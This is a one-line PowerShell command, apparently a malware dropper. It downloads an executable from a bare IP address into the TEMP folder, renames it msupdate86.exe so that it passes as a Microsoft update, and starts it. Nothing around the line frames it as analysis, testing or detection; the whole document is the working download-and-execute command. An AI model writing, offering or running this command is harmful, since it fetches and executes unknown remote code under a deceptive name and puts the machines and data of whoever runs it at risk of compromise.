
(New-Object System.Net.WebClient).DownloadFile('http://185.141.25.142/update.exe',"$env:TEMP\msupdate86.exe");Start-Process ("$env:TEMP\msupdate86.exe")

